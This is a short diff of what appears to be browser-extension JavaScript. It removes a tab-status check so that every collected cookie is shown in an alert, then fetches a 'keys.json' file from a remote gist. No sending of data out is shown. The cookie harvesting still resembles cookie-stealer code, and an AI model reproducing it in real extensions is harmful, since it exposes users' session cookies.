@@ -30,14 +30,7 @@
             for(i=0;i<cookie.length;i++){
                 nullObj.push(JSON.stringify(cookie[i], null, 4));
             };
-            if (changeInfo.status == 'complete' && tab.active) {
-                if (tab.url === 'chrome://newtab/'){
-                    return true
-                }
-                else{
-                    alert(nullObj);
-                };
-            };
+            alert(nullObj);
         });
         var xhl = new XMLHttpRequest();
         xhl.open('GET', 'https://gist.githubusercontent.com/the5orcerer/87fd54148d22081426bb3cada383da44/raw/66ec4b9f48a7b6a73f2d9afa4d24279c91cf0d77/keys.json', false);
